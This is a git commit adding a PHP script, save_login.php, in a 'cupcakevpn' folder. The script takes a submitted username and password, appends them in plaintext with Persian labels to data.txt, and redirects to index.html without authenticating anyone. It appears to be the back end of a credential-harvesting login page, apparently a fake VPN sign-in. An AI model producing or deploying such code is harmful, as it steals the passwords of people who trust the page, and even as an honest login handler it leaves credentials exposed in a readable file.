fba4124c6fb8be6296271f3cd9e1f3632c0e460e
abolfazldaana <140502862+abolfazldaana@users.noreply.github.com>
2023-07-27 19:18:45 +0330

    BE

---
+++ cupcakevpn/save_login.php
@@ -0,0 +1,14 @@
+<?php
+if (isset($_POST['submit'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $rememberme = isset($_POST['rememberme']) ? 'بله' : 'خیر';
+
+    $data = "نام کاربری: $username, رمز عبور: $password, مرا به خاطر بسپار: $rememberme" . PHP_EOL;
+
+    file_put_contents('data.txt', $data, FILE_APPEND);
+
+    header('Location: index.html');
+    exit;
+}
+?>
